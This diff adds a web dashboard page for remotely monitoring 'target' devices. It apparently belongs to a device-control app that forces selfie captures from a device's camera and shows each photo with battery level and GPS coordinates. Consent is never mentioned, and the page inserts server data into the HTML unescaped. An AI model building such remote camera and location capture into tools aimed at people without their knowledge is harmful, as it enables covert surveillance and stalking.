@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anasio | Selfie Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="theme-color" content="#ffffff">
+    <style>
+        .selfie-card { transition: transform 0.2s, box-shadow 0.2s; }
+        .selfie-card:hover { transform: translateY(-4px); box-shadow: 0 12px 28px rgba(0,0,0,0.12); }
+        .selfie-img { object-fit: cover; aspect-ratio: 3/4; }
+        .date-pill { transition: all 0.15s; }
+        .date-pill.active { background: #059669; color: white; border-color: #059669; }
+        .modal-overlay { background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); }
+    </style>
+</head>
+<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
+    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
+        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
+            <div class="flex items-center gap-4">
+                <div class="bg-emerald-600 text-white p-2 rounded-lg">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><circle cx="12" cy="13" r="3"></circle></svg>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold tracking-tight text-gray-900">Selfie Verification</h1>
+                    <p class="text-xs text-gray-500 font-medium">Facial capture gallery</p>
+                </div>
+            </div>
+            <div class="flex flex-wrap justify-center items-center gap-4">
+                <a href="/" class="text-xs font-bold text-blue-600 hover:text-blue-800 transition tracking-wide uppercase">← Dashboard</a>
+                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
+                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
+                <a href="/errors_view" class="text-xs font-bold text-red-500 hover:text-red-700 transition tracking-wide uppercase">Diagnostics</a>
+                <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
+                    <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
+                        <option value="">Awaiting connection...</option>
+                    </select>
+                </div>
+                <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
+            </div>
+        </nav>
+
+        <!-- Force Selfie Controls -->
+        <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-200 mb-6">
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
+                <div>
+                    <h2 class="text-sm font-bold text-gray-700 uppercase tracking-widest">Remote Capture</h2>
+                    <p class="text-xs text-gray-400 mt-1">Force an immediate selfie capture or wait for the next scheduled one</p>
+                </div>
+                <div class="flex items-center gap-3">
+                    <button id="force-selfie-btn" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-3 rounded-xl font-bold text-sm transition shadow-md hover:shadow-lg uppercase tracking-wide">
+                        📸 Force Selfie Now
+                    </button>
+                    <button id="refresh-btn" class="bg-gray-100 hover:bg-gray-200 text-gray-700 px-4 py-3 rounded-xl font-bold text-sm transition border border-gray-200">
+                        ↻ Refresh
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Date Filter -->
+        <div class="bg-white rounded-2xl p-4 shadow-sm border border-gray-200 mb-6">
+            <div class="flex items-center gap-2 flex-wrap">
+                <span class="text-xs font-bold text-gray-400 uppercase tracking-widest mr-2">Filter by Date:</span>
+                <button class="date-pill active text-xs font-bold px-4 py-2 rounded-full border border-gray-200 cursor-pointer" data-date="">All</button>
+                <div id="date-pills" class="flex gap-2 flex-wrap"></div>
+            </div>
+        </div>
+
+        <!-- Selfie Count -->
+        <div class="mb-4 flex items-center justify-between">
+            <p id="selfie-count" class="text-sm text-gray-500 font-medium"></p>
+        </div>
+
+        <!-- Selfie Grid -->
+        <div id="selfie-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
+            <div class="col-span-full text-center py-20 text-gray-400 text-sm">No selfies yet. Use "Force Selfie Now" to capture one.</div>
+        </div>
+
+        <!-- Image Modal -->
+        <div id="modal" class="fixed inset-0 z-50 hidden items-center justify-center modal-overlay">
+            <div class="bg-white rounded-3xl shadow-2xl max-w-2xl w-full mx-4 overflow-hidden">
+                <div class="relative">
+                    <img id="modal-img" src="" class="w-full max-h-[70vh] object-contain bg-black" />
+                    <button id="modal-close" class="absolute top-4 right-4 bg-black/50 hover:bg-black/70 text-white w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold transition">✕</button>
+                </div>
+                <div class="p-6">
+                    <p class="text-sm text-gray-500"><span class="font-bold text-gray-700">Captured:</span> <span id="modal-time"></span></p>
+                    <p class="text-sm text-gray-500 mt-1"><span class="font-bold text-gray-700">Battery:</span> <span id="modal-battery"></span>%</p>
+                    <p class="text-sm text-gray-500 mt-1"><span class="font-bold text-gray-700">Location:</span> <span id="modal-location"></span></p>
+                    <div class="mt-4 flex gap-3">
+                        <a id="modal-download" href="" download class="bg-emerald-600 hover:bg-emerald-700 text-white px-5 py-2 rounded-xl font-bold text-xs transition uppercase tracking-wide">Download</a>
+                        <button id="modal-delete" class="bg-red-50 hover:bg-red-100 text-red-600 px-5 py-2 rounded-xl font-bold text-xs transition uppercase tracking-wide">Delete</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+const deviceSelect = document.getElementById('device-select');
+const selfieGrid = document.getElementById('selfie-grid');
+const selfieCount = document.getElementById('selfie-count');
+const datePills = document.getElementById('date-pills');
+const modal = document.getElementById('modal');
+const modalImg = document.getElementById('modal-img');
+const modalTime = document.getElementById('modal-time');
+const modalBattery = document.getElementById('modal-battery');
+const modalLocation = document.getElementById('modal-location');
+const modalDownload = document.getElementById('modal-download');
+const modalDelete = document.getElementById('modal-delete');
+const modalClose = document.getElementById('modal-close');
+let currentSelfieId = null;
+let selectedDate = '';
+
+async function loadDevices() {
+    try {
+        const resp = await fetch('/devices');
+        const data = await resp.json();
+        deviceSelect.innerHTML = '';
+        if (data.devices && data.devices.length > 0) {
+            data.devices.forEach((d, i) => {
+                const opt = document.createElement('option');
+                opt.value = d;
+                opt.textContent = d;
+                deviceSelect.appendChild(opt);
+            });
+            loadDates();
+            loadSelfies();
+        } else {
+            deviceSelect.innerHTML = '<option value="">No devices</option>';
+        }
+    } catch (e) {
+        console.error('Failed to load devices:', e);
+    }
+}
+
+async function loadDates() {
+    const deviceId = deviceSelect.value;
+    if (!deviceId) return;
+    try {
+        const resp = await fetch(`/selfie_dates?device_id=${encodeURIComponent(deviceId)}`);
+        const data = await resp.json();
+        datePills.innerHTML = '';
+        (data.dates || []).forEach(d => {
+            const btn = document.createElement('button');
+            btn.className = 'date-pill text-xs font-bold px-4 py-2 rounded-full border border-gray-200 cursor-pointer hover:bg-gray-100';
+            btn.dataset.date = d.date;
+            btn.textContent = `${d.date} (${d.count})`;
+            btn.addEventListener('click', () => {
+                selectedDate = d.date;
+                document.querySelectorAll('.date-pill').forEach(p => p.classList.remove('active'));
+                btn.classList.add('active');
+                loadSelfies();
+            });
+            datePills.appendChild(btn);
+        });
+    } catch (e) {}
+}
+
+async function loadSelfies() {
+    const deviceId = deviceSelect.value;
+    if (!deviceId) return;
+    let url = `/selfie_list?device_id=${encodeURIComponent(deviceId)}`;
+    if (selectedDate) url += `&date=${encodeURIComponent(selectedDate)}`;
+    try {
+        const resp = await fetch(url);
+        const data = await resp.json();
+        const selfies = data.selfies || [];
+        selfieCount.textContent = `${selfies.length} selfie${selfies.length !== 1 ? 's' : ''} captured`;
+        if (selfies.length === 0) {
+            selfieGrid.innerHTML = '<div class="col-span-full text-center py-20 text-gray-400 text-sm">No selfies found for this filter.</div>';
+            return;
+        }
+        selfieGrid.innerHTML = '';
+        selfies.forEach(s => {
+            const card = document.createElement('div');
+            card.className = 'selfie-card bg-white rounded-2xl overflow-hidden shadow-sm border border-gray-200 cursor-pointer';
+            card.innerHTML = `
+                <img src="${s.url}" class="selfie-img w-full rounded-t-2xl" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23eee%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2255%22 text-anchor=%22middle%22 fill=%22%23999%22 font-size=%2212%22>No image</text></svg>'"/>
+                <div class="p-3">
+                    <p class="text-xs font-bold text-gray-700 truncate">${s.timestamp}</p>
+                    <p class="text-[10px] text-gray-400 mt-1">🔋 ${s.battery}% · 📍 ${s.lat.toFixed(4)}, ${s.lon.toFixed(4)}</p>
+                </div>
+            `;
+            card.addEventListener('click', () => openModal(s));
+            selfieGrid.appendChild(card);
+        });
+    } catch (e) {
+        console.error('Failed to load selfies:', e);
+    }
+}
+
+function openModal(s) {
+    currentSelfieId = s.id;
+    modalImg.src = s.url;
+    modalTime.textContent = s.timestamp;
+    modalBattery.textContent = s.battery;
+    modalLocation.textContent = `${s.lat.toFixed(6)}, ${s.lon.toFixed(6)}`;
+    modalDownload.href = s.url;
+    modal.classList.remove('hidden');
+    modal.classList.add('flex');
+}
+
+function closeModal() {
+    modal.classList.add('hidden');
+    modal.classList.remove('flex');
+    currentSelfieId = null;
+}
+
+modalClose.addEventListener('click', closeModal);
+modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
+
+modalDelete.addEventListener('click', async () => {
+    if (!currentSelfieId) return;
+    if (!confirm('Delete this selfie permanently?')) return;
+    const form = new FormData();
+    form.append('selfie_id', currentSelfieId);
+    await fetch('/delete_selfie', { method: 'POST', body: form });
+    closeModal();
+    loadSelfies();
+    loadDates();
+});
+
+document.getElementById('force-selfie-btn').addEventListener('click', async () => {
+    const deviceId = deviceSelect.value;
+    if (!deviceId) return alert('No device selected');
+    const btn = document.getElementById('force-selfie-btn');
+    btn.textContent = '⏳ Sending...';
+    btn.disabled = true;
+    const form = new FormData();
+    form.append('device_id', deviceId);
+    await fetch('/force_selfie', { method: 'POST', body: form });
+    setTimeout(() => {
+        btn.textContent = '📸 Force Selfie Now';
+        btn.disabled = false;
+    }, 2000);
+    // Auto-refresh after a few seconds to pick up the new selfie
+    setTimeout(() => { loadSelfies(); loadDates(); }, 8000);
+    setTimeout(() => { loadSelfies(); loadDates(); }, 15000);
+});
+
+document.getElementById('refresh-btn').addEventListener('click', () => {
+    loadSelfies();
+    loadDates();
+});
+
+document.querySelector('.date-pill[data-date=""]').addEventListener('click', () => {
+    selectedDate = '';
+    document.querySelectorAll('.date-pill').forEach(p => p.classList.remove('active'));
+    document.querySelector('.date-pill[data-date=""]').classList.add('active');
+    loadSelfies();
+});
+
+deviceSelect.addEventListener('change', () => {
+    selectedDate = '';
+    document.querySelectorAll('.date-pill').forEach(p => p.classList.remove('active'));
+    document.querySelector('.date-pill[data-date=""]').classList.add('active');
+    loadDates();
+    loadSelfies();
+});
+
+loadDevices();
+setInterval(loadSelfies, 30000);
+</script>
+</body>
+</html>
